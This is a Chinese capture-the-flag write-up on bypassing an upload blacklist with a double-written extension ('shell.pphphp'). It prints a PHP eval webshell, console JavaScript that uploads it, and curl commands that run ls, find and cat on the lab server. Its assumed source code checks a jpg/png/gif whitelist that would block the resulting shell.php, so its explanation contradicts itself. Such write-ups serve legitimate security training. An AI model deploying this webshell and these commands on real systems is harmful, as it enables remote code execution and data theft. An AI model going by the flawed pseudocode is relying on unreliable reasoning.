## 题目分析与源码审计
本关卡针对文件后缀进行了黑名单校验。通过测试发现，当上传包含 `php` 后缀的文件时，服务器会将其拦截。根据题目名称“双写后缀”推断，后端的过滤逻辑极大概率是：**检测到黑名单中的后缀（如 `php`），将其替换为空（删除）**。由于替换函数通常只执行一次（非递归），这就留下了可利用的空间。

假设后端源码逻辑如下（伪代码）：
php
$name = basename($_FILES['file']['name']);
// 将 php 替换为空
$name = str_replace("php", "", $name); 
$whitelist = array("jpg", "png", "gif");
$ext = pathinfo($name)['extension'];

if (in_array($ext, $whitelist)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "upload/" . $name);
}
## 漏洞分析：
1. 服务器简单地使用了 str_replace 等函数进行一次过滤，而不是循环过滤直到不存在敏感字符。
2. 如果我们上传一个名为 shell.pphphp 的文件：
◦ 服务器遇到第一个 php（即 pphphp 中的第一个）将其删除，剩下的字符串刚好拼接成 shell.php。
◦ 最终存入服务器的文件名为 shell.php，成功绕过了黑名单并保留了可执行权限。
## 绕过过程
为了规避本地杀毒软件的拦截，依然采用浏览器控制台直接构造文件并提交的方式：
1. 在靶场页面按 F12 打开开发者工具，切换到 “控制台 (Console)”。
2. 注入以下 JavaScript 代码，构造名为 shell.pphphp 的文件并自动提交：
// 1. 构造双写后缀的文件名
let fileName = "shell.pphphp"; 
let blob = new Blob(["<?php @eval($_POST['pass']);?>"], {type: 'image/jpeg'});

// 2. 注入到表单并自动提交
let dataTransfer = new DataTransfer();
dataTransfer.items.add(new File([blob], fileName, {type: 'image/jpeg'}));
document.querySelector('input[type="file"]').files = dataTransfer.files;

setTimeout(() => {
    document.querySelector('input[type="submit"]').click();
}, 500);
console.log("双写木马已发送，正在提交...");
// 3.网页自动提交后，服务器成功将 shell.pphphp 过滤成了 shell.php 并保存，页面回显上传成功。

## 获取 Flag
使用 curl 命令执行系统命令：
### 验证木马：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('ls');"
### 查找 Flag：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('find / -name *flag*');"
### 读取 Flag：
curl -X POST "http://靶场域名/upload/shell.php" -d "pass=system('cat /var/www/html/flag_1661417591.php');"
